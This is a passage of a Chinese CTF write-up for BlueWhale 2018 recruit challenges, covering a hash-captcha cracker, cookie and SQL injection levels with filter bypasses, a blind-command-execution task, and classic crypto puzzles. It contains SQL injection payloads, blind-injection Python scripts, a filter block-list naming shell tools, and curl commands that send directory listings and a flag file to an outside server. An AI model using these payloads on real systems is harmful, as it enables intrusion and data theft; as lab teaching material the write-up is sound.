可以保证范围合理，不超过6位并且不会超出哈希函数结果的范围（如不会出现&quot;99 105&quot;这种），并且范围和第二行的待破解验证码的长度相等</span><br><span class="line">如</span><br><span class="line">    MD5</span><br><span class="line">    dc55b0</span><br><span class="line">    0 5</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过MD5运算后的0到5位为&quot;dc55b0&quot;</span><br><span class="line">输出格式</span><br><span class="line">该验证码的破解结果</span><br><span class="line">如</span><br><span class="line">    3f2d81a</span><br><span class="line">表示字符串&quot;3f2d81a&quot;经过MD5运算后的0到5位为&quot;dc55b0&quot;</span><br><span class="line">更多例子</span><br><span class="line">输入</span><br><span class="line">    MD5</span><br><span class="line">    9d73</span><br><span class="line">    10 13</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过MD5运算后的10到13位为&quot;9d73&quot;</span><br><span class="line">输出</span><br><span class="line">    a05b9c</span><br><span class="line">表示字符串&quot;a05b9c&quot;经过MD5运算后的10到13位为&quot;9d73&quot;</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">    SHA256</span><br><span class="line">    08a31f</span><br><span class="line">    1 6</span><br><span class="line">表示我们需要寻找一个字符串，使得该字符串经过SHA256运算后的1到6位为&quot;08a31f&quot;</span><br><span class="line">输出</span><br><span class="line">    c26bdc</span><br><span class="line">表示字符串&quot;c26bdc&quot;经过SHA256运算后的1到6位为&quot;08a31f&quot;</span><br></pre></td></tr></table></figure><p> 此类的哈希验证码在CTF竞赛中十分常见，需要碰撞一个最大长度为6的哈希，如果直接使用暴力破解的话效率十分低下，能多久跑出来就看命，但是如果使用彩虹表的话就完全不一样了。<br>这里只以最长的6位验证码为例，6位以下的更简单。<br> 首先分析一下，长度为6的哈希值，其范围为从000000~ffffff，也就是说一共有16^6=16777216种哈希值，这个数只到千万级别，不是很大。那么在理想情况（所有字符串产生的哈希值前六位均不同），我们只需要字符集0~f组成的6位16777216个不同的字符串，就一定可以得到所有的6位哈希值，但是现实中并没有这样的理想情况，这16777216个不同的字符串中有很大概率会有些字符串的哈希值前6位是相同的，为了降低这个概率，我们就需要更多的字符串。<br> 如果我们同样使用0~f的字符集，组成7位字符串，就会产生16^7=268435456种不同的哈希，这个数是6位字符串的16倍，已经到了亿级别了，可以有非常大的概率保证覆盖了000000~ffffff所有的哈希可能值，但是16^7又有点太大了，其中有很多冗余数据我们在查验证码的时候用不到，所以需要对范围进行调整，从0000000~3ffffff将会用到480M的内存，从0000000~4fffff会用掉700M的内存，当然范围越大准确率也越高，但是占的内存也越多。<br> 另外为了查询彩虹表方便，需要对彩虹表进行一定规律的排序，根据哈希值进行排序就能很快的移动文件指针找到对应行。<br>脚本如下(以MD5为例)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Generate</span><span class="params">(ran1, ran2, filename)</span>:</span></span><br><span class="line">    cache_dict = &#123;&#125;</span><br><span class="line">    length = ran2 - ran1</span><br><span class="line">    a = <span class="string">'%0'</span> + str(length + <span class="number">1</span>) + <span class="string">'x'</span></span><br><span class="line">    b = <span class="string">'%0'</span> + str(length) + <span class="string">'x'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]Generating cache...'</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">7</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">6</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffff</span></span><br><span class="line">        ranges2 = <span class="number">0x100000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">4</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">3</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ff</span></span><br><span class="line">        ranges2 = <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges1):</span><br><span class="line">    <span class="comment"># for i in xrange(0xfffff):</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x4fffff): # 700MB + RAM</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x3fffff): # 480MB + RAM</span></span><br><span class="line">        s = a % i</span><br><span class="line">        sub_hash = md5(s).hexdigest()[ran1:ran2]</span><br><span class="line">        cache_dict[sub_hash] = s</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]Done.'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]Writing to disk...'</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        miss = <span class="string">'*'</span> * (length + <span class="number">1</span>)</span><br><span class="line">        miss = <span class="string">'%s '</span> + miss + <span class="string">'n'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges2):</span><br><span class="line">            k = b % i</span><br><span class="line">            <span class="keyword">if</span> cache_dict.has_key(k):</span><br><span class="line">                f.write(<span class="string">'%s %sn'</span> % (k, cache_dict[k]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.write(miss % k)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]Done.'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]Saved as '</span>%s<span class="string">' at current directory.'</span> % filename</span><br><span class="line">    <span class="keyword">del</span> cache_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Proof</span><span class="params">(proof, filename)</span>:</span></span><br><span class="line">    length = len(proof)</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        offset = int(proof, <span class="number">16</span>) * (length + <span class="number">1</span> + length + <span class="number">1</span> + <span class="number">1</span>)</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        result = f.read(length + <span class="number">1</span> + length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> result.split()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">generate(<span class="number">0</span>, <span class="number">6</span>, <span class="string">'dic.txt'</span>)</span><br><span class="line"><span class="keyword">print</span> proof(<span class="string">'dc55b0'</span>, <span class="string">'dic.txt'</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="cookie-150"><a href="#cookie-150" class="headerlink" title="cookie (150)"></a>cookie (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你知道什么是cookie吗？</span><br><span class="line"></span><br><span class="line">(cookie本身并不是flag)</span><br><span class="line">http:&#x2F;&#x2F;*********:8080&#x2F;</span><br></pre></td></tr></table></figure><p>将cookie中give_me_the_flag的值改为1刷新即可<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911204309.png" alt></p><blockquote><p>flag{U_jus7_3dit_The_cookie}</p></blockquote><hr><h2 id="BabySQLi-200"><a href="#BabySQLi-200" class="headerlink" title="BabySQLi (200)"></a>BabySQLi (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Baby SQL injection.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25252&#x2F;</span><br><span class="line"></span><br><span class="line">注：此题仅限大一学生，大二及以上学生不计分</span><br></pre></td></tr></table></figure><p>这个题没什么难的，Hint也给了语句，什么也没过滤，告诉了flag在fl4g表里，直接注入就行，另外注意sqlite中没有井号（#）注释符</p><p>payload：’ union select * from fl4g –<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205408.png" alt></p><blockquote><p>flag{B4BY_5q1_1nJec7i0n}</p></blockquote><hr><h2 id="BabyBurp-200"><a href="#BabyBurp-200" class="headerlink" title="BabyBurp (200)"></a>BabyBurp (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Change another way to visit a website?</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*********&#x2F;BabyBurp.php</span><br><span class="line"></span><br><span class="line">hint: You should download a tool ----&gt;&quot;burp suite&quot;</span><br></pre></td></tr></table></figure><p>下载<a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuit</a><br>开启代理拦截，题目里说“You may use your iphoneXXXXXX to find the flag?”，所以更改user agent为“iphoneXXXXXX”的即可。<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205049.png" alt></p><blockquote><p>flag{Bu1p_1s_tH3_beSt}</p></blockquote><hr><h2 id="EasySQLi-220"><a href="#EasySQLi-220" class="headerlink" title="EasySQLi (220)"></a>EasySQLi (220)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Very easy SQl injection.</span><br><span class="line">What did I filter?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25254&#x2F;</span><br></pre></td></tr></table></figure><p>继续用上一题的payload发现union、select和from被过滤掉了，用双写或大小写都能绕过<br>payload1：’ uNion selEct * frOm fl4g –<br>payload2：’ ununionion selselectect * frfromom fl4g –<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205615.png" alt></p><blockquote><p>flag{50_ea5y_r1gh7}</p></blockquote><hr><h2 id="HardSQLi-250"><a href="#HardSQLi-250" class="headerlink" title="HardSQLi (250)"></a>HardSQLi (250)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A little difficult SQL injection</span><br><span class="line">Really looks like the previous challenge?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;*******:25255&#x2F;</span><br></pre></td></tr></table></figure><p>接着用第一题的payload测试，发现出了union、select和from被过滤外，空格也被过滤掉了，可以利用注释符/**/绕过，另外大小写不能绕过关键字的过滤，只有双写能绕过<br>payload：’/**/uniunionon/**/seselectlect/**/*/**/frfromom/**/fl4g/**/–/**/<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205945.png" alt></p><blockquote><p>flag{4_b1t_0f_HaRd_hhhhhh}</p></blockquote><hr><h2 id="BadSQLi-300"><a href="#BadSQLi-300" class="headerlink" title="BadSQLi (300)"></a>BadSQLi (300)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I heard only the real bad-ass can solve this challenge.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;srpopty.cn:25253&#x2F;</span><br></pre></td></tr></table></figure><p>这个题除了前面那些过滤外，还过滤掉了所有空白字符，星号（*）以及逗号，只能盲注，空白字符可以用括号绕过<br>payload1（获取列名）：1’oorr(selorect(hex(sql))frorom(sqlite_master))like(‘%s%%’)–<br>payload2（获取flag）：1’oorr(selorect(hex(text))frorom(fl4g))like(‘%s%%’)–</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.hexdigits</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.86.208:25253/?id='</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"1'oorr(selorect(hex(sql))frorom(sqlite_master))like('%s%%')--"</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"1'oorr(selorect(hex(text))frorom(fl4g))like('%s%%')--"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; len(dic):</span><br><span class="line">    payload = payload1 % (result + dic[i])</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    ret = requests.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'When'</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        result += dic[i]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] '</span> + result</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Result: '</span> + result.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{ThI5_5q1i_s0_B4444d}</p></blockquote><hr><h2 id="RealSQL"><a href="#RealSQL" class="headerlink" title="RealSQL"></a>RealSQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag is admin&#39;s password.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;********:23333&#x2F;</span><br></pre></td></tr></table></figure><p>这是一道真正的SQL注入题，不像前面的题目甚至给出了查询语句的样子，这个题什么也没有给，所以需要自己试一试哪些被过滤掉了，被过滤掉的字符都会弹出<br>“illegal character!!@_@”的提示，以此来判断哪些字符被过滤掉了。</p><p>大部分在登录或注册等界面的SQL注入，注入点基本都在username处，大部分网站在后端会把password进行哈希，与数据库中保存的进行比较，所以password不大可能有注入。</p><p>这里直接给出过滤的正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;|"</span>.urldecode(<span class="string">'%09'</span>).<span class="string">"|"</span>.urldecode(<span class="string">"%0a"</span>).<span class="string">"|"</span>.urldecode(<span class="string">"%0b"</span>).<span class="string">"|"</span>.urldecode(<span class="string">'%0c'</span>).<span class="string">"|"</span>.urldecode(<span class="string">'%0d'</span>).<span class="string">"|"</span>.urldecode(<span class="string">'%a0'</span>).<span class="string">"/i"</span>;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match($filter,$str))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strrpos($str,urldecode(<span class="string">"%00"</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt; alert('illegal character!!@_@');parent.location.href='index.php'; &lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到被过滤的有空格、空白字符、*、#、union、like、regexp、for、and、or、–、&amp;、|等常见的注入字符<br>但是还有一些SQL语句操作符没有被过滤掉</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%,&gt;,&lt;,~</span><br></pre></td></tr></table></figure><p>首先测试uname，如果uname随便输入一个用户的话，会弹出“username error!!@_@”的提示，所以可以肯定有一次对uname的查询，以此首先来判断uname是否存在，那么猜测查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uname=<span class="string">'&#123;$input&#125;'</span></span><br></pre></td></tr></table></figure><p>其中$input为我们的输入，虽然过滤掉了所有的空白字符，但是有很多布尔以及算数运算符没有被过滤，那么就可以构造连续的布尔式获取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where username&#x3D;&#39;&#39;!&#x3D;(mid((username)from(-1))&#x3D;&#39;a&#39;)</span><br></pre></td></tr></table></figure><p>如果(mid((username)from(-1))=’a’)返回了0，那么中间的表达式就会为false，整个表达式也会为false，如果返回了1，就代表查到了数据，因此可以提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;!&#x3D;(mid((passwd)from(-1))&#x3D;&#39;e&#39;)&#x3D;&#39;1&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>这样一位一位的猜出来password<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-  coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://********:23333/login.php"</span></span><br><span class="line"></span><br><span class="line">randstr = string.ascii_letters + string.digits + <span class="string">'&#125;_&#123;'</span></span><br><span class="line">remark = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> randstr:</span><br><span class="line">        passwd = i+remark</span><br><span class="line">        uname = <span class="string">"'!=(mid((passwd)from(-&#123;j&#125;))='&#123;passwd&#125;')='1"</span>.format(</span><br><span class="line">            j=str(j), passwd=passwd)</span><br><span class="line">        data = &#123;<span class="string">"uname"</span>: uname, <span class="string">"passwd"</span>: <span class="string">"ddd"</span>&#125;</span><br><span class="line">        <span class="keyword">print</span> uname</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"password error!!"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            remark = passwd</span><br><span class="line">            <span class="keyword">print</span> remark</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{THI5_1s_Real_sq1}</p></blockquote><hr><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please do this challenge after you can login with admin.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;********:23333&#x2F;</span><br></pre></td></tr></table></figure><p>这个题需要上个题登录到admin以后才能做，用上一题的flag登录成功后可以看到一个命令执行的界面，题目的目的非常简单，执行命令，但是看不到命令执行的结果，只能知道命令是否执行完成，另外此题对命令也做了一些过滤，但是并不是很难。</p><p>最简单的思路就是用反弹shell获取数据，但是对反弹shell也做了一些限制，过滤正则如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter &#x3D; &quot; |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh&quot;;</span><br></pre></td></tr></table></figure><p>空格可以使用${IFS}绕过，获取数据可以用curl<br>首先在自己的服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345 -vv</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>***.***.***.***:12345/`ls<span class="variable">$&#123;IFS&#125;</span>-al|base64`</span><br></pre></td></tr></table></figure><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924155642.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>123.206.86.208:12345/`cat<span class="variable">$&#123;IFS&#125;</span>flag_788f1a3aa1fa053f7fa6560d456f4b92|base64`</span><br></pre></td></tr></table></figure><blockquote><p>flag{sql_iNJEct_comMond_eXEC!}</p></blockquote><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="BabyCrypto-100"><a href="#BabyCrypto-100" class="headerlink" title="BabyCrypto (100)"></a>BabyCrypto (100)</h2><pre><code>Who is Caesar?Notice: This question is limited to the freshman , sophomore and above will not scoredqwlr{G3cj_P4dj_NLp5lC_n1as3c}</code></pre><p>flag被凯撒加密了，qwlr{G3cj_P4dj_NLp5lC_n1as3c}就是密文，解密即可</p><blockquote><p>flag{V3ry_E4sy_CAe5aR_c1ph3r}</p></blockquote><hr><h2 id="BabyCrypto2-100"><a href="#BabyCrypto2-100" class="headerlink" title="BabyCrypto2 (100)"></a>BabyCrypto2 (100)</h2><pre><code>This is a simple Morse Code!Notice: This question is limited to the freshman , sophomore and above will not scoredHint: All characters of flag are uppercase.flag{-... .- -... -.-- -- --- .-. ... . -.-. --- -.. .}</code></pre><p>这次是被用摩斯电码加密了，也是直接解密即可，注意flag中所有的字符都是大写（莫斯电码不区分大小写）</p><blockquote><p>flag{BABYMORSECODE}</p></blockquote><hr><h2 id="RSA-150"><a href="#RSA-150" class="headerlink" title="RSA (150)"></a>RSA (150)</h2><pre><code>RSA is based on a simple formula, let&apos;s do a math problem.c = 150815d = 1941N = 435979what is the decrypted number?Hint: flag&apos;s format is flag{decrypted number}</code></pre><p>这个题只是考察了RSA的解密公式<br><code>decrypted = c ^ d mod N</code></p><p>另外在RSA体系中，m、c、d、e、n这些的含义大都是固定的，随便找几篇文章就能懂。<br>最后结果为133337</p><blockquote><p>flag{133337}</p></blockquote><hr><h2 id="RSA2-250"><a href="#RSA2-250" class="headerlink" title="RSA2 (250)"></a>RSA2 (250)</h2><pre><code>This puzzle are different from the previous puzzle, what&apos;s the &quot;dq&quot; and &quot;dp&quot;? Can you decrypt the ciphertext?c: 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885p: 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243q: 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629dp: 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961dq: 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</code></pre><p>和上一道题相比没有了d以及n，多了dp和dq，题目描述中也问了什么是dp以及dq，它们与中国剩余定理算法相关<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911211512.png" alt></p><ul><li>p和q是素数</li><li>dp = d mod (p - 1)</li><li>dq = d mod (q - 1)</li><li>qInv = (1/q) mod p （1/q为q的乘法逆元）</li><li>m1 = c^dp mod p</li><li>m2 = c^dq mod q</li><li>h = qInv * (m1 - m2) mod p</li><li>m = m2 + h * q</li></ul><p>现在直接按照上述步骤计算即可，p、q、dp、dq与c均已知，最后就能直接算出明文m，另外上述步骤中的qInv是模逆的</p><p>具体请参考：<a href="https://www.di-mgt.com.au/crt_rsa.html" target="_blank" rel="noopener">应用于RSA的中国剩余定理</a></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span 